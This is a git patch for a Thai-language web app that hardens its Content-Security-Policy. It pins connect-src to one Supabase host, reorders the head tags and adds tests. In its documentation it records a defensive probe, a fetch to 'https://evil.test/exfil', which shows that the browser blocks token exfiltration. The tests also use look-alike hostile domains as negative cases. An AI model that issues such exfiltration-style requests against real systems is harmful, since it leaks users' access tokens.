@@ -1,0 +1,198 @@
+From 72c37ba571a5f0cafaff2f81fbb9c01277382334 Mon Sep 17 00:00:00 2001
+From: piyawatv-cloud <295929244+piyawatv-cloud@users.noreply.github.com>
+Date: Sat, 5 Sep 2026 13:42:55 +0700
+Subject: [PATCH 15/24] fix(workspace): pin the CSP host and prove the policy
+ is enforced
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+Three corrections to the policy added in cd92591.
+
+connect-src named `https://*.supabase.co`, which let a hostile bundle
+POST the access token to any Supabase project — the exact destination
+class the doc claimed was closed, and wider than pwsApprovedOrigin()'s
+own refusal of wildcard hosts. It now pins the deployment host, and
+harness.js swaps in the test project the same way it already swaps
+SB_URL. The wildcard-matching test keeps its coverage by swapping the
+policy in and out itself, so it tests the parser without endorsing a
+wildcard in what ships.
+
+The meta tag sat after the preconnect and Google Fonts links, so those
+were requested before the parser had the policy. It is now the first
+element after <meta charset>. Charset stays first because it must fall
+within the first 1024 bytes and the Thai comment above the policy had
+pushed it to byte 1422, where Chrome guesses the encoding instead.
+
+Every test runs over file://, which proves the parser reads the policy
+but not that a browser enforces it. Served a copy over local HTTP and
+probed it: fetch to a non-allowlisted host is refused by CSP (the
+browser says so, rather than failing as an indistinguishable network
+error) while the fonts stylesheet and the cdnjs script still load.
+Evidence recorded in the doc.
+
+Tests: node harness.js 56/56 (1 new); LC_ALL=C ./tests/run-sql-tests.sh PASS.
+Data structures: unchanged. Build stamp: 2026-09-05.5.
+Critical Change — auth boundary; needs CODEOWNER @phossatron review.
+
+Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>
+Claude-Session: https://claude.ai/code/session_019ydP6KsDDZ9owE8qtTqFTj
+---
+ docs/PRIVATE_WORKSPACE_CSP.md | 35 +++++++++++++++++++++++++++++++----
+ harness.js                    | 10 +++++++---
+ index.html                    |  6 +++---
+ tests/formula-studio.test.js  | 24 ++++++++++++++++++++----
+ 4 files changed, 61 insertions(+), 14 deletions(-)
+
+diff --git a/docs/PRIVATE_WORKSPACE_CSP.md b/docs/PRIVATE_WORKSPACE_CSP.md
+index 169e6ca..bc6b052 100644
+--- a/docs/PRIVATE_WORKSPACE_CSP.md
++++ b/docs/PRIVATE_WORKSPACE_CSP.md
+@@ -18,7 +18,7 @@ CSP **ไม่ได้** กันการอ่าน — โค้ดที
+ 
+ | directive | ผล |
+ |---|---|
+-| `connect-src 'self' https://*.supabase.co` | `fetch`/XHR/WebSocket ไป host อื่นถูกบล็อก |
++| `connect-src 'self' https://<supabase-host>` | `fetch`/XHR/WebSocket ไป host อื่นถูกบล็อก |
+ | `img-src 'self' data: blob:` | ปิดการ exfiltrate ผ่าน image beacon |
+ | `form-action 'none'` | ปิดการส่งออกผ่าน form submit |
+ | `object-src 'none'` / `base-uri 'none'` | ปิด plugin และการย้ายฐาน URL ของหน้า |
+@@ -45,18 +45,45 @@ CSP **ไม่ได้** กันการอ่าน — โค้ดที
+ 
+ `pwsCspAllowsConnect()` รับ wildcard host แบบ `https://*.example.com` โดยแมตช์เฉพาะ
+ subdomain จริงเท่านั้น (`https://example.com` และ `https://evil-example.com` ไม่ผ่าน)
++แต่ **นโยบายที่ส่งขึ้นจริงห้ามใช้ wildcard** — `https://*.supabase.co` จะเปิดให้
++bundle ส่ง access token ไป project อื่นของ Supabase ได้ ซึ่งเป็นปลายทางกลุ่มเดียวกับ
++ที่เอกสารนี้อ้างว่าปิดไปแล้ว · `connect-src` จึงปักหมุด host ของ deployment ตรง ๆ
++และ `harness.js` เปลี่ยนเป็น host ของเทสต์ให้เอง เหมือนที่ทำกับ `SB_URL`
+ 
+ ## การพิสูจน์
+ 
+-`node harness.js` — 55 เทสต์ ในนั้นมี 5 เทสต์สำหรับเรื่องนี้: CSP ยังมีความหมาย
++`node harness.js` — 56 เทสต์ ในนั้นมี 6 เทสต์สำหรับเรื่องนี้: CSP ยังมีความหมาย
+ (ไม่มี `unsafe-eval`/wildcard), connect-src ยอมเฉพาะที่ประกาศ, wildcard แมตช์
+-เฉพาะ subdomain, ไม่มี CSP = ปฏิเสธไว้ก่อน, และ origin นอก CSP ต้องไม่ mount
+-และไม่ยิง request
++เฉพาะ subdomain, นโยบายจริงต้องปักหมุด Supabase host ไม่ใช่ wildcard,
++ไม่มี CSP = ปฏิเสธไว้ก่อน, และ origin นอก CSP ต้องไม่ mount และไม่ยิง request
+ 
+ `harness.js` ยังตรวจ CSP ของ `index.html` ก่อนดัดแปลงเพื่อเทสต์ด้วย — ถ้ามีใครใส่
+ `unsafe-eval` หรือ wildcard หรือลบ `object-src`/`base-uri`/`connect-src` ออก
+ harness จะหยุดทันทีพร้อมบอกเหตุผล ไม่ปล่อยให้เทสต์ผ่านแบบไม่มีความหมาย
+ 
++### พิสูจน์บนเบราว์เซอร์จริง (ไม่ใช่แค่ meta อยู่ในไฟล์)
++
++เทสต์ทั้งหมดรันบน `file://` จึงพิสูจน์ได้แค่ว่า "ตัวแยกวิเคราะห์อ่านนโยบายถูก"
++ไม่ได้พิสูจน์ว่าเบราว์เซอร์ *บังคับใช้* จึงเสิร์ฟสำเนาหน้าผ่าน HTTP บน localhost
++แล้วยิง `fetch('https://evil.test/exfil?t=1')` ผลที่ได้ (2026-09-05):
++
++```
++{"evil":"REJECTED:TypeError","fonts":"LOADED","cdn":"LOADED"}
++Connecting to 'https://evil.test/exfil?t=1' violates the following
++Content Security Policy directive: "connect-src 'self' https://…"
++```
++
++คือถูกปฏิเสธด้วย CSP จริง ไม่ใช่ network error ที่บังเอิญหน้าตาเหมือนกัน
++และ Google Fonts กับ cdnjs ยังโหลดผ่านตามปกติ ไม่ได้ถูกบล็อกไปด้วย
++
++### ลำดับใน `<head>` มีผล
++
++meta CSP คุมเฉพาะทรัพยากรที่ parser เห็น *หลัง* จากมัน จึงต้องอยู่ต้น `<head>`
++ก่อน `<link rel="preconnect">` และ stylesheet ทั้งหมด · แต่ต้องอยู่ **หลัง**
++`<meta charset>` เสมอ เพราะ charset ต้องอยู่ใน 1024 ไบต์แรกของไฟล์ และคอมเมนต์
++ภาษาไทยเหนือ meta CSP ยาวพอที่จะดันมันเกินไปได้ (เคยดันไปถึงไบต์ที่ 1422 มาแล้ว
++ซึ่งทำให้ Chrome เดา encoding เองและภาษาไทยเพี้ยนทั้งหน้า)
++
+ หมายเหตุสำหรับคนรัน harness: หน้าเทสต์เปิดผ่าน `file://` ซึ่ง `'self'` ไม่แมตช์ไฟล์
+ ข้างเคียง harness จึง **inline** ชุดเทสต์เข้าไปในหน้าแทนการใช้ `<script src>`
+ และติด id `fs-test-suite` / `fs-test-prelude` ไว้ เพื่อให้เทสต์ที่ตรวจว่า
+diff --git a/harness.js b/harness.js
+index 7502309..0ef09ca 100644
+--- a/harness.js
++++ b/harness.js
+@@ -36,9 +36,13 @@ for(const required of ["object-src 'none'", "base-uri 'none'", 'connect-src ']){
+ // origin ทดสอบต้องถูกอนุญาตเหมือน origin จริงของ deployment มิฉะนั้น loader จะ
+ // ปฏิเสธ mount แบบ fail-closed และเทสต์ workspace ทั้งชุดจะวัดอะไรไม่ได้เลย
+ // `https://evil.test` จงใจไม่อยู่ในรายการ เพื่อให้เทสต์ทางลบยังพิสูจน์ได้จริง
+-html = html.replace(
+-  /(<meta http-equiv="Content-Security-Policy" content="[^"]*?connect-src )/,
+-  '$1https://opc.example.test https://other.example.test ');
++html = html.replace(/(<meta http-equiv="Content-Security-Policy" content=")([^"]*)(">)/, function(match, open, policy, close){
++  let rewritten = policy;
++  // นโยบายจริงปักหมุด Supabase host ของ deployment ไว้ ต้องเปลี่ยนเป็นของเทสต์
++  // ด้วย มิฉะนั้น config ของ production จะติดไปกับไฟล์เทสต์
++  if(originalUrl) rewritten = rewritten.split(originalUrl).join('https://test-project.supabase.co');
++  return open + rewritten.replace('connect-src ', 'connect-src https://opc.example.test https://other.example.test ') + close;
++});
+ 
+ const mockPrelude = `<script id="fs-test-prelude">
+ window.__FS_TEST__ = true;
+diff --git a/index.html b/index.html
+index 9e6b072..55226e5 100755
+--- a/index.html
++++ b/index.html
+@@ -2,7 +2,6 @@
+ <html lang="th">
+ <head>
+ <meta charset="UTF-8">
+-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <!--
+   Content-Security-Policy — ชั้นจำกัดปลายทางของ private-workspace bundle
+   bundle ถูก import() เข้ามาทำงานใน origin เดียวกับ Formula จึงอ่าน
+@@ -12,7 +11,8 @@
+   connect-src ด้านล่างด้วย มิฉะนั้น loader จะปฏิเสธการ mount แบบ fail-closed
+   (ดู pwsCspAllowsConnect) แทนที่จะพังเงียบ ๆ ตอนยิง request
+ -->
+-<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' blob: https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com data:; img-src 'self' data: blob:; connect-src 'self' https://*.supabase.co; object-src 'none'; base-uri 'none'; form-action 'none'">
++<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' blob: https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com data:; img-src 'self' data: blob:; connect-src 'self' https://uumkwaliebucxebkkllm.supabase.co; object-src 'none'; base-uri 'none'; form-action 'none'">
++<meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>Beyond Lab — Formula Studio</title>
+ <link rel="preconnect" href="https://fonts.googleapis.com">
+ <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+@@ -659,7 +659,7 @@ select.fi.role-select{width:auto;min-width:104px;height:36px;padding:0 8px;font-
+   <div class="logo"><svg viewBox="0 0 24 24"><path d="M6 22a2 2 0 0 1-1.73-3L9 11.35V4H8a1 1 0 0 1 0-2h8a1 1 0 0 1 0 2h-1v7.35L19.73 19A2 2 0 0 1 18 22H6Zm5-10.11L8.31 16.5h7.38L13 11.89V4h-2v7.89Z"/></svg></div>
+   <div>
+     <div class="hdr-title">Formula Studio</div>
+-    <div class="hdr-sub">Beyond Laboratory — R&D Briefing Tool · build 2026-09-05.4</div>
++    <div class="hdr-sub">Beyond Laboratory — R&D Briefing Tool · build 2026-09-05.5</div>
+   </div>
+   <div class="sync-chip" id="syncChip" onclick="sbManualSync()" title="สถานะการซิงก์ข้อมูลกับเซิร์ฟเวอร์กลาง"></div>
+ </div>
+diff --git a/tests/formula-studio.test.js b/tests/formula-studio.test.js
+index ca59c79..5e8a6da 100644
+--- a/tests/formula-studio.test.js
++++ b/tests/formula-studio.test.js
+@@ -831,10 +831,26 @@
+   });
+ 
+   test('wildcard host ใน connect-src ต้องแมตช์เฉพาะ subdomain จริง', function(){
+-    assert(pwsCspAllowsConnect('https://uumk.supabase.co'), 'subdomain ที่ถูกต้องกลับถูกปฏิเสธ');
+-    assert(!pwsCspAllowsConnect('https://supabase.co'), 'โดเมนแม่ผ่าน wildcard ได้');
+-    assert(!pwsCspAllowsConnect('https://evil-supabase.co'), 'โดเมนที่แค่ลงท้ายคล้ายกันผ่านได้');
+-    assert(!pwsCspAllowsConnect('https://supabase.co.evil.test'), 'suffix ถูกใช้เป็น prefix ได้');
++    // นโยบายที่ส่งขึ้นจริงปักหมุด host เต็ม ๆ ไม่มี wildcard · เทสต์นี้จึงสลับ
++    // นโยบายชั่วคราวเพื่อพิสูจน์ตัวแยกวิเคราะห์ ไม่ใช่เพื่อรับรอง wildcard ในของจริง
++    const meta = cspMeta();
++    const saved = meta.getAttribute('content');
++    try{
++      meta.setAttribute('content', "connect-src 'self' https://*.supabase.co");
++      assert(pwsCspAllowsConnect('https://uumk.supabase.co'), 'subdomain ที่ถูกต้องกลับถูกปฏิเสธ');
++      assert(!pwsCspAllowsConnect('https://supabase.co'), 'โดเมนแม่ผ่าน wildcard ได้');
++      assert(!pwsCspAllowsConnect('https://evil-supabase.co'), 'โดเมนที่แค่ลงท้ายคล้ายกันผ่านได้');
++      assert(!pwsCspAllowsConnect('https://supabase.co.evil.test'), 'suffix ถูกใช้เป็น prefix ได้');
++    }finally{
++      meta.setAttribute('content', saved);
++    }
++  });
++
++  test('นโยบายที่ส่งขึ้นจริงต้องปักหมุด Supabase host ไม่ใช่ wildcard', function(){
++    // wildcard จะเปิดให้ bundle ส่ง access token ไป project อื่นของ Supabase ได้
++    const csp = cspMeta().getAttribute('content');
++    const connect = (csp.split(';').find(function(part){ return part.trim().startsWith('connect-src'); }) || '');
++    assert(!/\*\.supabase\.co/.test(connect), 'connect-src ยังเปิดกว้างให้ทุก project ของ Supabase');
+   });
+ 
+   test('ไม่มี CSP ให้ตรวจ = ปฏิเสธไว้ก่อน', function(){
+-- 
+2.39.5 (Apple Git-154)
+
